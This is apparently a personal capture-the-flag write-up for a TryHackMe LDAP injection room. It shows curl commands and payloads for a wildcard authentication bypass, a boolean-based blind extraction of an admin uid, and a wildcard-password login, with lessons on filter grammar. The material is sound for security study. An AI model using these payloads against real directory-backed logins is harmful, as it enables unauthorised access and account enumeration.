# LDAP Injection (TryHackMe)

Room: LDAP Injection — Web Application Pentesting / Injection Attacks. Authentication bypass and
boolean-based **blind** extraction against a PHP app that builds an LDAP filter
`(&(uid=$username)(userPassword=$password))` from raw POST input. Completed: 2026-11-09 | Target:
<ip> (`LDAP.Injection.v.1.3-badr`). Solved **fully headless from `C:\CTF`** with `curl` +
Python stdlib — no browser, no ldapsearch, no AttackBox.

## Answers

| Task | Where | Answer |
|---|---|---|
| 5 | `normal.php` — wildcard auth bypass | `THM{…}` |
| 7 | `login.php` dashboard (after blind extract) | `THM{…}` |

## Task 5 — wildcard injection (`normal.php`)

`username=*&password=*` → filter `(&(uid=*)(userPassword=*))` → returns the **first** entry
("Welcome, Bob Smith!"). A bare `*` only ever yields the first match, so to reach other users, anchor
the uid with a leading character + wildcard (`f*`). Sweeping first letters enumerates the directory
and surfaces the flag user, whose `cn` **is** the flag:

```bash
for ch in a b c d e f ... z 0..9; do
  curl -s "http://IP/normal.php" --data-urlencode "username=${ch}*" --data-urlencode "password=*"
done
# a* -> Admin User | b* -> Bob Smith | j* -> John Doe
# f* -> Welcome, THM{…}
```

The response even echoes the live query component `(&(uid=f*)(userPassword=*))`, confirming the
injection point.

## Task 6/7 — boolean-based blind (`blind.php` → `login.php`)

`blind.php` (DN `ou=users,dc=ldap,dc=thm`) gives no data, only a conditional message. The tautology
payload splits the AND so the password branch is always satisfied via an empty-AND `(&)`:

```
username = <prefix><char>*)(|(&      password = pwd)
-> filter (&(uid=<prefix><char>*)(|(&)(userPassword=pwd)))
```

- **True oracle** (a uid matches `<prefix><char>*`): page renders
  `<p style="color: green;">Something is wrong in your password.</p>`.
- **False**: no such paragraph.

`ldap_blind.py` walks the uid character-by-character (threaded charset scan, 16 workers; LDAP
metacharacters `* ( ) & |` excluded from the candidate set so the wildcard can't self-match):

```
a -> ad -> adm -> admin -> admin_bl1nd@ldap.thm
FINAL uid: admin_bl1nd@ldap.thm
```

Then log in at `login.php` with that uid and a **wildcard password** — the uid pins the entry, `*`
makes `userPassword=*` always true:

```bash
curl -s "http://IP/login.php" \
  --data-urlencode "username=admin_bl1nd@ldap.thm" --data-urlencode "password=*"
# -> Dashboard: THM{…}
```

(The room's Task 7 reference script does the same extraction with `requests`/BeautifulSoup against the
green-paragraph oracle; `http.client` + a substring check is the dependency-free equivalent.)

## Lessons

- **`*` grabs only the first entry.** Wildcard-only auth bypass logs you in, but as whoever sorts
  first. To target a specific account, anchor with a known character (`f*`) or extract the uid blind —
  don't assume `*:*` lands on the interesting user.
- **The tautology is about operator balancing, not quotes.** LDAP filters are prefix/paren
  expressions; `*)(|(&` closes the `uid=` clause and opens an OR whose first branch is an empty AND
  `(&)` — which LDAP treats as **always true** — so the `userPassword` check is bypassed regardless of
  value. Mirror of SQLi `OR 1=1`, different grammar.
- **Blind oracle = any stable response diff.** Here it's a green `<p>` ("Something is wrong in your
  password") present only when the uid prefix matches. Pick the most reliable marker (a CSS style or
  exact string), not just "page changed".
- **Keep wildcards out of the guessing alphabet.** Including `*`/`(`/`)`/`&`/`|` as candidate
  characters during blind extraction causes false positives (they alter the filter structure); restrict
  candidates to plausible uid bytes and keep the metacharacters only in the fixed injection scaffold.
- **Two different DNs, two different user sets.** `normal.php` searches `ou=People`, `blind.php`/login
  search `ou=users` — enumerate each separately rather than reusing uids across endpoints.
- **Headless pattern** (cf. [[server-side-template-injection]], [[nosql-injection]],
  [[advanced-sql-injection]]): `curl --data-urlencode` for the reflected bypass, a threaded
  `http.client` boolean-oracle loop for the blind extraction — all from `C:\CTF`. Success oracles are
  the `Welcome, …`/`THM{` reflection (Task 5) and the green paragraph (Task 7).
